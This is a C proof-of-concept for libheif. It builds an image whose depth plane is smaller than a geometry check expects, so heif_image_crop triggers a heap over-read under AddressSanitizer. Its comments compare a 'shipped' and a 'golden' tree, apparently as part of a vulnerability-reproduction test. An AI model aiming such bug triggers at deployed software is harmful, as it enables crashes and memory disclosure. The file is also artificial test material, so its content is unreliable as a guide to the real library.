// PoC: a 4:2:0 image carrying an extra data channel (depth) at half
// resolution passes the plane-geometry gate on the shipped tree, so the
// row-wise memcpy in HeifPixelImage::crop() reads past the depth plane.
// On the golden tree the gate expects the full image size for the depth
// channel, rejects the image, and crop() returns an error instead.
//
// Build (against the ASan build of the tree under test):
//   gcc -fsanitize=address -g pocs/residual.c -Ilibheif/api \
//       -L<build>/libheif -lheif -Wl,-rpath,<build>/libheif -o residual
// Run:
//   ./residual

#include <stdio.h>
#include <libheif/heif.h>

static int check(struct heif_error err, const char* what)
{
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "%s failed: %s\n", what, err.message);
    return 0;
  }
  return 1;
}

int main(void)
{
  struct heif_image* img = NULL;

  if (!check(heif_image_create(256, 256, heif_colorspace_YCbCr, heif_chroma_420, &img),
             "heif_image_create")) {
    return 1;
  }

  // Well-formed 4:2:0 planes.
  if (!check(heif_image_add_plane(img, heif_channel_Y, 256, 256, 8), "add Y")) return 1;
  if (!check(heif_image_add_plane(img, heif_channel_Cb, 128, 128, 8), "add Cb")) return 1;
  if (!check(heif_image_add_plane(img, heif_channel_Cr, 128, 128, 8), "add Cr")) return 1;

  // Extra data channel at reduced (chroma) resolution.
  if (!check(heif_image_add_plane(img, heif_channel_depth, 128, 128, 8), "add depth")) return 1;

  struct heif_error err = heif_image_crop(img, 0, 0, 0, 0);
  if (err.code != heif_error_Ok) {
    // The geometry gate rejected the image: no defect triggered.
    printf("crop rejected: %s\n", err.message);
    heif_image_release(img);
    return 0;
  }

  printf("crop succeeded\n");
  heif_image_release(img);
  return 0;
}
